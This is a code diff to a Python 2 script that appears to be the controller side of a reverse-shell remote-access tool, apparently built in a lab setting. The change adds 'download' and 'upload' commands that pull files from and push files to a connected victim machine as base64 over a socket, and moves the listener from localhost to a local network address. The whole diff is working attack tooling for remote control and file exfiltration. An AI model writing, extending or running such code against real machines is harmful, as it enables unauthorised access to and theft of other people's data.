@@ -2,6 +2,7 @@
 
 import socket
 import json # Using this to send and receive as much data we want
+import base64
 
 def reliable_send(data):
 	json_data = json.dumps(data)
@@ -28,6 +29,19 @@ def shell():
 			break
 		elif command[0:3] == 'cd ' and len(command) > 2:
 			continue
+		elif command[0:8] == 'download':
+			# Open a file with the same name, where we will write the recevied content.
+			file = open(command[9:], "wb") # b stands for bytes, as we want to download all types of files.
+			result = reliable_recv()
+			# Use base64 encoding and decoding.
+			file.write(base64.b64decode(result))
+		elif command[0:6] == 'upload':
+			try:
+				file = open(command[7:], "rb")
+				reliable_send(base64.b64encode(file.read()))
+			except:
+				failed = "Upload failed!"
+				reliable_send(base64.b64encode(failed))
 		else:
 			# Receiving the info from client (no of bytes)
 			output = reliable_recv()
@@ -39,7 +53,7 @@ def server():
 
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Options for the socket.
 
-	s.bind(("127.0.0.1", 42069)) # Binding the socket to an IP address and a port
+	s.bind(("10.0.2.15", 42069)) # Binding the socket to an IP address and a port
 
 	s.listen(5) # Means that it will listen for 5 connections
 	print "Listening for incoming connections"
